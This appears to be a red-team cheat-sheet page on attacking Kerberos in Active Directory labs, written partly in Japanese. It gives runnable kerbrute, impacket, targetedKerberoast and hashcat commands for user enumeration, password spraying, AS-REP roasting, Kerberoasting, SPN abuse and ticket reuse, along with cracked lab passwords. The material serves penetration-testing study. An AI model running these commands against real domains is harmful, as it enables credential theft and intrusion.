---
title: 88 Kerberos
parent: Services
grand_parent: Red Team
nav_order: 88
has_children: true
---
# Kerberos

---

# Default Port

- 88

---

# Attack Flow

Enum → Valid Users → AS-REP / Kerberoast → Crack → Ticket Abuse → Lateral Move

---

# Service Info

Kerberos is an authentication protocol used in Active Directory environments for secure identity verification.

It is based on ticket-granting mechanisms (TGT/TGS) instead of transmitting passwords over the network.

Kerberos is a core component of domain authentication in Windows environments.


---
# Common security issues

- Weak or reused domain credentials
- AS-REP Roasting (pre-authentication disabled users)
- Kerberoasting (service ticket extraction and offline cracking)
- Pass-the-Ticket attacks
- Golden Ticket / Silver Ticket abuse (ticket forgery)
- Time synchronization issues affecting authentication
- Privileged account misuse in ticket generation
- SPN misconfiguration exposing service accounts

---
# Note:
*When investigating DC, it is important to synchronize the time.
If there is a time difference of five minutes or more between the DC and the compromised device, there are two ways to address this.*
### faketime

```zsh
faketime 'now + 8 hours' impacket-getTGT ping.htb/c.roberts:'AssumedBreach123' -dc-ip 10.129.50.3
```

### systemd-timesyncd

```
sudo systemctl stop systemd-timesyncd
```

```bash
sudo ntpdate -u dc1.ping.htb
```

```bash
sudo hwclock --systohc
```

もとに戻す
```zsh
sudo ntpdate ntp.nict.jp
```

# 1. Initial Scan
```zsh
nmap -p 88 --script krb5-enum-users,krb5-info <IP>
```

👉 Check:

domain presence
Kerberos realm
supported encryption types

---

# Enumeration

```zsh
kerbrute userenum -d <DOMAIN> users.txt --dc <IP>
```

```zsh
kerbrute userenum --dc 10.67.191.107 -d THM-AD users.txt
```

```zsh
kerbrute userenum -d hokkaido-aerospace.com --dc 192.168.186.40 /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -t 100
```

### Password Spray

```zsh
kerbrute passwordspray -d hokkaido-aerospace.com domain_users.txt rockyou.txt
```

### Kerberos事前認証無効アカウントの調査

#### Windows用のusernameファイルの作成
- 事前にkerbruteやenum4linux等でDCの名前のフォーマットを調べ、そのフォーマットに対応するようにファイルを作成します。

- ファーストネーム・ラストネーム形式

```bash
/home/kali/github/username-anarchy/username-anarchy --input-file ./users.txt --select-format first.last
```
![](../../assets/images/Pasted%20image%2020260508212653.png)

  - ファーストネームイニシャル・ラストネーム形式
  
```bash
/home/kali/github/username-anarchy/username-anarchy --input-file ./users_Initial_lastname.txt --select-format flast
```
![](../../assets/images/Pasted%20image%2020260508212749.png)

  - 注意: 画面出力しかされないので、これらを含むテキストファイルを改めて作成します。

👉 Check:

valid usernames
account lock behavior
domain structure

---

## 3. AS-REP Roasting Check

https://qiita.com/Rextuku/items/971f762f7d45944bd6e3

```zsh
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <IP>
```

```bash
impacket-GetNPUsers -usersfile users_Initial_lastname.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.10.175 'EGOTISTICAL-BANK.LOCAL/'
```

👉 Goal:

extract crackable hashes (no pre-auth users)

---

## 4. Kerberoasting
```zsh
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <IP> -request
```

```zsh
impacket-GetUserSPNs oscp.exam/r.andrews:Password123! -dc-ip 192.168.56.200 -request
```

![](../../assets/images/Pasted%20image%2020260602222817.png)

### Repository
https://github.com/ShutdownRepo/targetedKerberoast
### Attack
```zsh
python3 targetedKerberoast.py -v -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip 192.168.186.40
```

![](../../assets/images/Pasted%20image%2020260508214035.png)

### Crack
```zsh
sudo hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
![](../../assets/images/Pasted%20image%2020260508214051.png)
haze1988

---

### Example
#### CheckRole
![](../../assets/images/Pasted%20image%2020260508214252.png)
yulia.weberがboris.crawfordに対してGenericWriteを持っている
#### SPNの書き込み
```powershell
PS C:\Users\yulia.weber\desktop> setspn -A MSSQLSvc/asdf laser\boris.crawford
Checking domain DC=laser,DC=com

Registering ServicePrincipalNames for CN=boris.crawford,CN=Users,DC=laser,DC=com
        MSSQLSvc/asdf
Updated object
```

![](../../assets/images/Pasted%20image%2020260508214309.png)

![](../../assets/images/Pasted%20image%2020260508214316.png)
zxcvbnm

👉 Goal:

extract service tickets (TGS)
offline password cracking

---

# 5.ADCS
## Attack Flow

Find vulnerable template → Request certificate → Authenticate (PKINIT) → Get TGT → Lateral Movement


[Attack Navi](../99_attack_repo/301-350_ad/301_ad_adcs.md)

---

# 6. Ticket Usage

### Get Ticket
```zsh
kinit svc_recovery@LOGGING.HTB
```
![](../../assets/images/Pasted%20image%2020260508213323.png)

# Ticket Info
```zsh
klist
```
![](../../assets/images/Pasted%20image%2020260508213331.png)

# Ticket Info2
```zsh
cat /etc/krb5.conf
```
![](../../assets/images/Pasted%20image%2020260508213340.png)

```zsh
export KRB5CCNAME=kevin.ccache
```

👉 Use tickets for:

SMB access
WinRM access
LDAP queries

---

# 7. Credential Hunting

👉 Common sources:

service accounts in AD
HTTP/SMB leaks
config files containing domain creds

---

# 8. Post Exploitation

👉 After valid ticket/creds:

enumerate domain users
check group membership
identify privileged accounts

---

# 9. No Credentials?

👉 Try:

username enumeration
AS-REP roasting
password spraying (domain-wide)

---

# 10. Lateral Movement / Pivot

👉 Kerberos enables:

cross-host authentication
SMB / WinRM reuse
AD pivoting

---

👉 If shell obtained:

→ [Windows Privilege Escalation](../04_privesc/windows.md)
